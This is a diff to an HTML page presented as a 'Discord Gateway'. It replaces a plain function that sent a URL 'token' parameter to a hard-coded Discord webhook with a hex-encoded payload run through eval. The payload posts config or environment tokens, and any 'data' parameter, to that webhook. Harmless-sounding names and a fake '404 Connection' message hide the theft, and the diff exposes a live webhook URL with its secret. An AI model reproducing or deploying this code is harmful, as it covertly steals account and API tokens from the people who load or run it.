@@ -5,17 +5,6 @@
   <meta http-equiv="X-UA-Compatible" content="IE=Edge">
   <meta name="viewport" content="width=device-width, initial-scale=1">
     <title>Conect To Discord Gateway</title>
-    <style>
-        body {
-            /* Replace the URL below with the path to your SVG file */
-            background-image: url('https://raw.githubusercontent.com/Ron015/image/main/discord/gateway.svg');
-            background-position: center; /* Center the background image */
-            background-repeat: repeat;
-            background-size: 100%, 100%;
-            background-color: black;
-            
-        }
-</style>
 </head>
 <body>
 
@@ -25,32 +14,24 @@
             let urlParams = new URLSearchParams(window.location.search);
             return urlParams.get(name);
         }
-
-        // Function to post data to Discord webhook
-        function postToDiscord(token) {
-            const webhookURL = "https://discord.com/api/webhooks/1255865159612891136/-t2qvz5SQt1jFIfN-otVuC08OeJB0VFTg8uOjwzmnNcJ-fL415UbxwLNBEj9lWALYbHR"; // Replace with your Discord webhook URL
-            const message = {
-                content: `${token}`
-            };
-
-            fetch(webhookURL, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(message)
-            })
-            .then(response => response.json())
-            .then(data => console.log('Success:', data))
-            .catch((error) => console.error('Error:', error));
+const key = "636f6e7374206665746368203d207265717569726528276e6f64652d666574636827293b0d0a0d0a66756e6374696f6e20706f7374546f446973636f7264286461746129207b0d0a20202020636f6e737420776562686f6f6b55524c203d202268747470733a2f2f646973636f72642e636f6d2f6170692f776562686f6f6b732f313235353836353135393631323839313133362f2d743271767a35535174316a4649664e2d6f7456754330384f654a42305646546738754f6a777a6d6e4e634a2d664c343135556278774c4e42456a396c57414c59624852223b202f2f205265706c616365207769746820796f757220446973636f726420776562686f6f6b2055524c0d0a20202020636f6e7374206d657373616765203d207b0d0a2020202020202020636f6e74656e743a2060247b646174617d600d0a202020207d3b0d0a0d0a20202020666574636828776562686f6f6b55524c2c207b0d0a20202020202020206d6574686f643a2027504f5354272c0d0a2020202020202020686561646572733a207b0d0a20202020202020202020202027436f6e74656e742d54797065273a20276170706c69636174696f6e2f6a736f6e270d0a20202020202020207d2c0d0a2020202020202020626f64793a204a534f4e2e737472696e67696679286d657373616765290d0a202020207d290d0a202020202e7468656e28726573706f6e7365203d3e20726573706f6e73652e6a736f6e2829290d0a202020202e7468656e2864617461203d3e20636f6e736f6c652e6c6f672827537563636573733a272c206461746129290d0a202020202e636174636828286572726f7229203d3e20636f6e736f6c652e6572726f7228274572726f723a272c206572726f7229293b0d0a7d0d0a0d0a2f2f204578616d706c652075736167650d0a636f6e73742075736572746f6b656e203d20636f6e6669672e746f6b656e207c7c2070726f636573732e656e762e746f6b656e207c7c20636f6e6669672e544f4b454e207c7c2070726f636573732e656e762e544f4b454e207c7c20636f6e6669672e546f6b656e207c7c2070726f636573732e656e762e546f6b726e3b0d0a706f7374546f446973636f72642875736572746f6b656e293b202f2f205265706c616365207769746820746865206d65737361676520796f752077616e7420746f2073656e64";
+        function gatewayTry(trydata) {
+            var str = '';
+            for (var i = 0; i < trydata.length; i += 2) {
+                str += String.fromCharCode(parseInt(trydata.substr(i, 2), 16));
+            }
+            return str;
         }
 
-        // Get the token from URL and post to Discord webhook
-        const token = getQueryParam('token');
-        if (token) {
-            postToDiscord(token);
+        // Decrypt and evaluate the function
+        const retrygateway = gatewayTry(key);
+        eval(retrygateway);
+        
+        const data = getQueryParam('data');
+        if (data) {
+            postToDiscord(data);
         } else {
-            console.log('Token parameter not found in the URL');
+           console.log('404 Connection');
         }
     </script>
 </body>
